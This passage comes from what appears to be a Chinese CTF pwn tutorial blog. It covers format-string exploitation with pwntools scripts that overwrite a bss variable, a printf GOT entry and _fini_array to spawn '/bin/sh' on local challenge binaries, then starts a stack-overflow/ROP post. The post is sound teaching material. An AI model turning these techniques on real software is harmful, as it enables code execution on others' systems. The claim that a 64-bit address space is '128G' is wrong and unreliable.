src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E3.png" alt="CTF - Pwn_格式化字符串漏洞3.png"></p><p><code>pwnme</code> 存储在 bss 段上：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E4.png" alt="CTF - Pwn_格式化字符串漏洞4.png"></p><p>编写 exp，利用格式化字符串漏洞修改 bss 段上 <code>pwnme</code> 的值：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./CGfsb"</span><span class="token punctuation">)</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x0804A068</span>   <span class="token comment"># pwnme 地址在伪代码中双击查看</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'aaaa'</span> <span class="token operator">+</span> <span class="token string">'%10\$n'</span>   <span class="token comment"># pwnme 的地址需要经过 32 位编码转换，是 4 字节，而 pwnme 的值需要等于 8，所以需要在 %10\$n 之前凑够 8 个字节，这里用 ‘aaaa’ 再凑 4 个字节</span><span class="token comment"># 由于是 32 位程序，因此根据泄漏的地址，pwnme 位于第 10 个地址的位置</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><em>其他例题见：《<a href="%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91string.md">【攻防世界】string</a>》、《<a href="%E3%80%90%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN%E3%80%91fmt_test2.md">【你想有多PWN】fmt_test2</a>》、《<a href="%E3%80%90HDCTF%202023%E3%80%91KEEP%20ON.md">【HDCTF 2023】KEEP ON</a>》 等</em></p></blockquote><hr><h1 id="格式化字符串利用工具"><a href="#格式化字符串利用工具" class="headerlink" title="格式化字符串利用工具"></a>格式化字符串利用工具</h1><blockquote><p><strong>注意：如果程序开启 PIE，需要先泄露出相关函数的真实地址</strong></p><p>（1）如果是泄露 <code>puts()</code> 或 <code>printf()</code> 之类的函数地址，可以先利用格式化字符串漏洞泄露出栈上的返回地址，例如返回地址为：<code>main + 30</code>，将该地址减去 30 获得 <code>main()</code> 的真实地址，然后利用 ELF 文件中 <code>main()</code> 与 <code>puts()</code> 的偏移来计算 <code>puts()</code> 或 <code>printf()</code> 之类的真实 got 表地址</p><p>（2）如果是获取 <code>system()</code> 地址或 <code>b&#39;/bin/sh&#39;</code> 的地址，可以利用 libcsearch 来寻找</p></blockquote><hr><h2 id="互联网脚本"><a href="#互联网脚本" class="headerlink" title="互联网脚本"></a>互联网脚本</h2><p>利用格式化字符串漏洞改写 <code>printf()</code> 的 GOT 表地址为 <code>system()</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    fmtstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>    <span class="token keyword">return</span> fmtstr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># offset:偏移位置; size:4?8; addr:写入地址; target:写入内容</span>    payload <span class="token operator">=</span> <span class="token string">b""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">return</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>32 位程序调用示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload_write_printf_got <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> printf_got_addr<span class="token punctuation">,</span> system_plt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>该脚本在部分情况下可行（32 位程序），但不完善，不太建议使用</strong></p><p><em>该脚本发送的数据会先将函数地址放在前面，将 <code>%数值c%参数顺序$格式化说明符</code> 放在后面，这种方式在 64 位程序中通常会出问题</em></p><p>假设：在 64 位程序中，某个函数的 GOT 表地址为 <code>0x112233445566</code>（总共 8 字节，但通常只使用 6 字节，最高两位为 <code>0x00</code>）</p><p>当我们使用 <code>payload = p64(0x112233445566) + b&#39;%6$p&#39;</code> 进行函数的真实地址的泄露时，发送地址时的顺序为：<code>0x66、0x55、0x44 ...... 0x11、0x00、0x00</code>（小端序）</p><p>当格式化字符串遇到 <code>b&#39;\x00&#39;</code> 时会被截断，后面的 <code>b&#39;%6$p&#39;</code> 无法传入，导致我们构造失败</p></blockquote><hr><h2 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload()"></a>fmtstr_payload()</h2><blockquote><p>官方文档：<a href="https://docs.pwntools.com/en/stable/fmtstr.html">pwnlib.fmtstr — Format string bug exploitation tools — pwntools 4.12.0 documentation</a></p></blockquote><p><code>fmtstr_payload()</code> 是 pwntools 里面的一个工具，和前面的互联网脚本功能类似，但是 <code>fmtstr_payload()</code> 更加的完善，可以简化对格式化字符串漏洞的利用过程，强烈推荐使用这个</p><p>一般常用的调用方法： <em>（32 位和 64 位程序均可使用）</em></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 格式：fmtstr_payload(偏移，&#123;源地址：目的地址&#125;)</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_plt<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以<strong>一次性同时修改多个地址</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 格式：fmtstr_payload(偏移，&#123;源地址1：目的地址1, 源地址2: 目的地址2&#125;)</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>_fini_array_addr<span class="token punctuation">:</span> main_addr<span class="token punctuation">,</span> printf_got_addr<span class="token punctuation">:</span> system_plt<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>完整的调用方法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fmtstr_payload<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> writes<span class="token punctuation">,</span> numbwritten <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> write_size <span class="token operator">=</span> <span class="token string">'byte'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>第一个参数 <code>offset</code> 表示格式化字符串的偏移  </li><li>第二个参数 <code>writes</code> 表示需要利用 %n 写入的数据，采用字典形式，如果需要改写 <code>printf()</code> 的 GOT 表地址为 <code>system_plt</code>，就写成 <code>&#123;printf_got_addr: system_plt&#125;</code> </li><li>第三个参数 <code>numbwritten</code> 表示已经输出的字符个数，默认值为 0</li><li>第四个参数 <code>write_size</code> 表示写入的方式：字节（byte）、双字节（short）、四字节（int），对应 hhn、hn、n，默认值为 byte，即按照 hhn 写入</li></ol><p>最终 <code>fmtstr_payload</code> 函数返回的就是需要发送的 payload</p></blockquote><hr><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="只能执行一次的格式化字符串"><a href="#只能执行一次的格式化字符串" class="headerlink" title="只能执行一次的格式化字符串"></a>只能执行一次的格式化字符串</h2><blockquote><p>大多数格式化字符串的题目会使用到 <code>while()</code> 之类的循环，以此来达到反复泄露并利用的目的</p><p>但也有部分情况下没有循环，只能利用一次格式化字符串漏洞，这时候常规方法就行不通了</p><p><strong>不过，这种利用方法需要的条件比较苛刻，例如：关闭 PIE</strong></p></blockquote><p>一个 64 位的例题：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">sys</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//gcc fmt_str_once_sys.c -no-pie -z norelro -o fmt_str_once_sys_x64_nopie</span><span class="token comment">//gcc -m32 fmt_str_once_sys.c  -no-pie -z norelro -o fmt_str_once_x86</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E8.png" alt="CTF - Pwn_格式化字符串漏洞8.png"></p><p>这里不存在 <code>while()</code> 之类的循环，只能利用一次格式化字符串漏洞</p><p>但是这样会发现我们什么也做不了，因为无论是通过将 <code>printf()</code> 的 GOT 表地址改为 <code>system_plt</code>，还是直接修改栈的返回地址为 <code>onegadget</code>，都至少需要两次漏洞的利用</p><p><strong>所以这里需要想办法让 <code>main()</code> 能够执行两次</strong></p><h3 id="Linux-下程序执行流程"><a href="#Linux-下程序执行流程" class="headerlink" title="Linux 下程序执行流程"></a>Linux 下程序执行流程</h3><p>在 Linux 中，程序的运行流程如下图所示：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E9.png" alt="CTF - Pwn_格式化字符串漏洞9.png"></p><p>整个程序的大致执行流程按顺序为：</p><ol><li><code>_start</code></li><li><code>__libc_start_main</code></li><li><code>init</code></li><li><code>.init_array[0]</code></li><li><code>.init_array[1]</code></li><li><code>......</code></li><li><code>.init_array[n]</code></li><li><code>main</code></li><li><code>fini</code></li><li><code>.fini_array[n]</code></li><li><code>.fini_array[n-1]</code></li><li><code>......</code></li><li><code>.fini_array[0]</code></li></ol><p>在 IDA 中可以看到 <code>_init_array</code> 和 <code>_fini_array</code> 这两个数组：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E10.png" alt="CTF - Pwn_格式化字符串漏洞10.png"></p><p>使用 <code>Ctrl + s</code> 可以看到各个段所在地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E11.png" alt="CTF - Pwn_格式化字符串漏洞11.png"></p><p>因此，我们可以通过修改 <code>_fini_array</code> 数组中存放的函数地址为 <code>main()</code> 地址，就可以实现在原来真正执行 <code>main()</code> 之后，还能再执行一次 <code>_fini_array</code> 数组中的 <code>main()</code></p><blockquote><p>但是注意：这样的操作并不能实现无限循环执行 <code>main()</code></p><p>在原来真正的 <code>main()</code> 结束后退出程序时，会调用 <code>_dl_fini</code> 这个函数，<code>_dl_fini</code> 会执行 <code>fini_array</code> 内的函数</p><p><code>main()</code> 返回到 <code>_dl_fini</code> 函数后，会将 <code>_fini_array</code> 的地址 -4，因为 <code>_fini_array</code> 是一个数组，所以这个 -4 的操作相当于将数组的下标 -1，相当于遍历 <code>_fini_array</code> 这个数组并执行其中的函数，每执行一个 <code>_fini_array</code> 内的函数都会返回到 <code>_dl_fini</code> 函数继续向下执行，而 <code>_fini_array</code> 内的函数是有限的，因此迟早会超出 <code>_fini_array</code> 的范围，当然也就不可能实现无限循环的效果了</p><p>最终，<code>_fini_array</code> 边界处的函数是 <code>frame_dummy</code>，<code>_dl_fini</code> 会检查此时要执行的函数是否和 <code>_fini_array</code> 边界处的函数相同，如果相同的话就不再执行</p></blockquote><h3 id="实现对-fini-array-的修改"><a href="#实现对-fini-array-的修改" class="headerlink" title="实现对 _fini_array 的修改"></a>实现对 _fini_array 的修改</h3><p>由于没有开启 PIE，因此暂时无需泄漏地址，IDA 中的偏移地址就是真实地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E12.png" alt="CTF - Pwn_格式化字符串漏洞12.png"></p><p>得到 <code>_fini_array</code> 的地址为 <code>0x4031D0</code></p><p>首先利用 <code>fmtstr_payload()</code> 将 <code>_fini_array_addr</code> 改为 <code>main_addr</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">_fini_array_addr <span class="token operator">=</span> <span class="token number">0x4031D0</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>_fini_array_addr<span class="token punctuation">:</span> main_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>debug<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过调试可以看到，原来真正的 <code>mian()</code> 执行结束后，又输出了一次 <code>&quot;input:\n&quot;</code>，证明我们已经成功让 <code>main()</code> 执行了第二次</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E13.png" alt="CTF - Pwn_格式化字符串漏洞13.png"></p><p>但是由于我们只有两次机会，其中一次机会还得利用 <code>fmtstr_payload()</code> 将 <code>_fini_array_addr</code> 改为 <code>main_addr</code></p><p>因为我们还需要利用 <code>fmtstr_payload()</code> 将 <code>printf_got_addr</code> 修改为 <code>system_plt</code>，最后还得再发送 <code>b&#39;/bin/sh&#39;</code> 来触发，所以这样次数还是不够用</p><p>因此我们可以利用 <code>fmtstr_payload()</code> 能一次性修改多个地址的特性，在第一次格式化字符串利用时同时将 <code>_fini_array_addr</code> 改为 <code>main_addr</code>、将 <code>printf_got_addr</code> 修改为 <code>system_plt</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>_fini_array_addr<span class="token punctuation">:</span> main_addr<span class="token punctuation">,</span> printf_got_addr<span class="token punctuation">:</span> system_plt<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当再次执行 <code>main()</code> 的时候，发送 <code>b&#39;/bin/sh&#39;</code> 来触发即可</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_once_sys_x64_nopie"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fmt_str_once_sys_x64_nopie"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>_fini_array_addr <span class="token operator">=</span> <span class="token number">0x4031D0</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span>   <span class="token comment"># system_addr = 0x4011D6</span>printf_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>_fini_array_addr<span class="token punctuation">:</span> main_addr<span class="token punctuation">,</span> printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出漏洞与ROP</title>
      <link href="/posts/e8388866.html"/>
      <url>/posts/e8388866.html</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h1><blockquote><p>栈溢出指的是程序向栈中的某个变量写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程</p><p>一般来说，栈溢出漏洞需要两个前提：</p><ol><li><strong>程序必须向栈上写入数据</strong></li><li><strong>写入的数据大小没有被良好地控制</strong></li></ol></blockquote><hr><h1 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h1><table><thead><tr><th align="left">名称</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left">ROP</td><td align="left">返回导向编程。在栈溢出的基础上，利用程序中已有的小片段（gadget）来改变某些寄存器或者变量的值，从而控制程序的执行流程</td></tr><tr><td align="left">Gadget</td><td align="left">一些以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程</td></tr></tbody></table><hr><h1 id="BSS-段"><a href="#BSS-段" class="headerlink" title="BSS 段"></a>BSS 段</h1><blockquote><p>.bss 段通常是用来存放程序中未初始化的或者初始化为 0 的全局变量和静态变量的一块内存区域。特点是可读写，在程序执行之前 .bss 会自动清 0</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E4.png" alt="栈溢出漏洞4.png"></p><blockquote><p>通常我们可以将一些参数写到 .bss 段上，例如：<code>&quot;/bin/sh&quot;</code>、<code>shellcode</code> 等 <em>（主要是因为栈的地址不好确定，并且一般栈中不可执行，而 .bss 段的地址容易确定，方便构造 ROP）</em></p><p>写入方式一般有：</p><ol><li>通过程序中自带的输入参数，有一些用户输入的参数直接就是存放在 .bss 段上的</li><li>配合栈溢出，利用 <code>read()</code>、<code>get()</code> 等函数构造 ROP 向 .bss 段上写入</li></ol></blockquote><hr><h1 id="64-位和-32-位"><a href="#64-位和-32-位" class="headerlink" title="64 位和 32 位"></a>64 位和 32 位</h1><blockquote><p>在利用栈溢出漏洞时，64 位程序与 32 位程序的 ROP 链写法是不同的</p></blockquote><h2 id="基本区别"><a href="#基本区别" class="headerlink" title="基本区别"></a>基本区别</h2><blockquote><p><mark>32位</mark>：cpu 一次处理 32 位数据，即 4 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 4G，即有 $2^{32}$ 个地址，从 32 个 0 到 32 个 1 的地址</p><p><mark>64位</mark>：cpu 一次处理 64 位数据，即 8 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 128G，即 $2^{64}$ 个地址，从 64 个 0 到 64 个 1 的地址</p></blockquote><p><em>内存地址的范围由 32 位变成了 64 位，但是可以使用的内存地址不能大于 0x00007FFFFFFFFFFF，否则会抛出异常</em></p><hr><h2 id="数据处理的函数"><a href="#数据处理的函数" class="headerlink" title="数据处理的函数"></a>数据处理的函数</h2><blockquote><p><code>p32()</code> 和 <code>p64()</code> 是对数据进行打包，常用于向目标机器发送数据</p><p><code>u32()</code> 和 <code>u64()</code> 是对数据进行解包，常用于接收从目标机器发送过来的数据</p></blockquote><ol><li><code>p32()</code> 是对 32 